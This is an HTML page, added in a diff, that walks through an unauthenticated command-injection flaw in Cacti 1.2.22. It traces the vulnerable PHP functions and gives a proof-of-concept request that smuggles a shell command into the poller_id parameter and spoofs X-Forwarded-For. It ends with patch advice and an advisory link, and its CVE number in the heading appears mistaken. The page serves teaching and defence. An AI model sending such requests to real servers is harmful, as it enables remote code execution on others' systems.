@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <title>Cacti1.2.22 Man Page</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+        <link rel="stylesheet" href="./style.css" />
+        <link rel="stylesheet" href="./meshstyle.css" />
+    </head>
+    <body>
+        <!-- partial:index.partial.html -->
+        <div class="fullscreen">
+            <svg
+                xmlns="http://www.w3.org/2000/svg"
+                width="297"
+                height="210"
+                overflow="visible"></svg>
+        </div>
+        <h1>CVE-2022-56169</h1>
+        <h2>Cacti 1.2.22 unauthenticated command injection Vulnerability</h2>
+        <div id="timeline" class="timeline">
+            <div class="btn-group">
+                <button class="btn" type="button" data-action="expand">Expand All</button>
+                <button class="btn" type="button" data-action="collapse">Collapse All</button>
+            </div>
+            <div class="timeline__item">
+                <div class="timeline__item-header">
+                    <button
+                        class="timeline__arrow"
+                        type="button"
+                        id="item1"
+                        aria-labelledby="item1-name"
+                        aria-expanded="false"
+                        aria-controls="item1-ctrld"
+                        aria-haspopup="true"
+                        data-item="1">
+                        >
+                    </button>
+                    <span class="timeline__dot"></span>
+                    <span id="item1-name" class="timeline__meta">
+                        <strong class="timeline__title">root@localhost</strong>
+                    </span>
+                </div>
+                <div
+                    class="timeline__item-body"
+                    id="item1-ctrld"
+                    role="region"
+                    aria-labelledby="item1"
+                    aria-hidden="true">
+                    <div class="timeline__item-body-content">
+                        <p class="timeline__item-p">
+                            sudo -i<br />
+                            admin
+                        </p>
+                    </div>
+                </div>
+            </div>
+            <div class="timeline__item">
+                <div class="timeline__item-header">
+                    <button
+                        class="timeline__arrow"
+                        type="button"
+                        id="item2"
+                        aria-labelledby="item1-name"
+                        aria-expanded="false"
+                        aria-controls="item1-ctrld"
+                        aria-haspopup="true"
+                        data-item="2">
+                        >
+                    </button>
+                    <span class="timeline__dot"></span>
+                    <span id="item1-name" class="timeline__meta">
+                        <strong class="timeline__title">remote_agent.php</strong>
+                    </span>
+                </div>
+                <div
+                    class="timeline__item-body"
+                    id="item2-ctrld"
+                    role="region"
+                    aria-labelledby="item1"
+                    aria-hidden="true">
+                    <div class="timeline__item-body-content">
+                        <p class="timeline__item-p">
+                            cd /var/www/html/cacti<br /><br />nano
+                            /var/www/html/cacti/remote_agent.php
+                        </p>
+                    </div>
+                </div>
+            </div>
+            <div class="timeline__item">
+                <div class="timeline__item-header">
+                    <button
+                        class="timeline__arrow"
+                        type="button"
+                        id="item3"
+                        aria-labelledby="item2-name"
+                        aria-expanded="false"
+                        aria-controls="item2-ctrld"
+                        aria-haspopup="true"
+                        data-item="3">
+                        >
+                    </button>
+                    <span class="timeline__dot"></span>
+                    <span id="item3-name" class="timeline__meta">
+                        <strong class="timeline__title">remote_client_authorized()</strong>
+                    </span>
+                </div>
+                <div
+                    class="timeline__item-body"
+                    id="item3-ctrld"
+                    role="region"
+                    aria-labelledby="item3"
+                    aria-hidden="true">
+                    <div class="timeline__item-body-content">
+                        <p class="timeline__item-p">
+                            nano /var/www/html/cacti/lib/html_utility.php<br /><br />mysql cacti<br /><br />mysql>
+                            SELECT * FROM poller;
+                        </p>
+                    </div>
+                </div>
+            </div>
+            <div class="timeline__item">
+                <div class="timeline__item-header">
+                    <button
+                        class="timeline__arrow"
+                        type="button"
+                        id="item4"
+                        aria-labelledby="item4-name"
+                        aria-expanded="false"
+                        aria-controls="item4-ctrld"
+                        aria-haspopup="true"
+                        data-item="4">
+                        >
+                    </button>
+                    <span class="timeline__dot"></span>
+                    <span id="item4-name" class="timeline__meta">
+                        <strong class="timeline__title">get_client_addr()</strong>
+                    </span>
+                </div>
+                <div
+                    class="timeline__item-body"
+                    id="item4-ctrld"
+                    role="region"
+                    aria-labelledby="item4"
+                    aria-hidden="true">
+                    <div class="timeline__item-body-content">
+                        <p class="timeline__item-p">
+                            nano /var/www/html/cacti/lib/functions.php<br /><br />The REMOTE_ADDR
+                            variable is set to the source IP address from the connection.<br /><br />Variables
+                            beginning with HTTP_ are populated by the corresponding HTTP headers
+                            received from the client.
+                        </p>
+                    </div>
+                </div>
+            </div>
+            <div class="timeline__item">
+                <div class="timeline__item-header">
+                    <button
+                        class="timeline__arrow"
+                        type="button"
+                        id="item5"
+                        aria-labelledby="item5-name"
+                        aria-expanded="false"
+                        aria-controls="item5-ctrld"
+                        aria-haspopup="true"
+                        data-item="5">
+                        >
+                    </button>
+                    <span class="timeline__dot"></span>
+                    <span id="item5-name" class="timeline__meta">
+                        <strong class="timeline__title">Exploit</strong>
+                    </span>
+                </div>
+                <div
+                    class="timeline__item-body"
+                    id="item5-ctrld"
+                    role="region"
+                    aria-labelledby="item5"
+                    aria-hidden="true">
+                    <div class="timeline__item-body-content">
+                        <p class="timeline__item-p">
+                            http://cacti-server-ip/cacti/remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=touch
+                            /tmp/hello.txt<br /><br />
+                            'X-Forwarded-For': '127.0.0.1'
+                        </p>
+                    </div>
+                </div>
+            </div>
+            <div class="timeline__item">
+                <div class="timeline__item-header">
+                    <button
+                        class="timeline__arrow"
+                        type="button"
+                        id="item6"
+                        aria-labelledby="item5-name"
+                        aria-expanded="false"
+                        aria-controls="item5-ctrld"
+                        aria-haspopup="true"
+                        data-item="6">
+                        >
+                    </button>
+                    <span class="timeline__dot"></span>
+                    <span id="item5-name" class="timeline__meta">
+                        <strong class="timeline__title">Patch</strong>
+                    </span>
+                </div>
+                <div
+                    class="timeline__item-body"
+                    id="item6-ctrld"
+                    role="region"
+                    aria-labelledby="item6"
+                    aria-hidden="true">
+                    <div class="timeline__item-body-content">
+                        <p class="timeline__item-p">
+                            By allowing the administrator to configure which HTTP proxy headers
+                            should be honored when determining the IP address of a client. Only the
+                            REMOTE_ADDR server variable should be used by default, ensuring a secure
+                            default configuration.<br /><br />The function get_nfilter_request_var()
+                            should be replaced with get_filter_request_var() to ensure that the
+                            $poller_id parameter is an integer.<br /><br />Furthermore, values
+                            should always be escaped before being passed to sensitive functions like
+                            proc_open.
+                        </p>
+                    </div>
+                </div>
+            </div>
+            <div class="timeline__item">
+                <div class="timeline__item-header">
+                    <button
+                        class="timeline__arrow"
+                        type="button"
+                        id="item7"
+                        aria-labelledby="item6-name"
+                        aria-expanded="false"
+                        aria-controls="item7-ctrld"
+                        aria-haspopup="true"
+                        data-item="7">
+                        >
+                    </button>
+                    <span class="timeline__dot"></span>
+                    <span id="item6-name" class="timeline__meta">
+                        <strong class="timeline__title">Official Security Advisory</strong>
+                    </span>
+                </div>
+                <div
+                    class="timeline__item-body"
+                    id="item7-ctrld"
+                    role="region"
+                    aria-labelledby="item6"
+                    aria-hidden="true">
+                    <div class="timeline__item-body-content">
+                        <p class="timeline__item-p">
+                            <a
+                                href="https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf"
+                                target="_blank"
+                                rel="noopener"
+                                >GitHub Link</a
+                            >
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- partial -->
+        <script src="./script.js"></script>
+        <script src="https://cdn.jsdelivr.net/gh/josephg/noisejs/perlin.js"></script>
+        <script src="./meshscript.js"></script>
+    </body>
+</html>
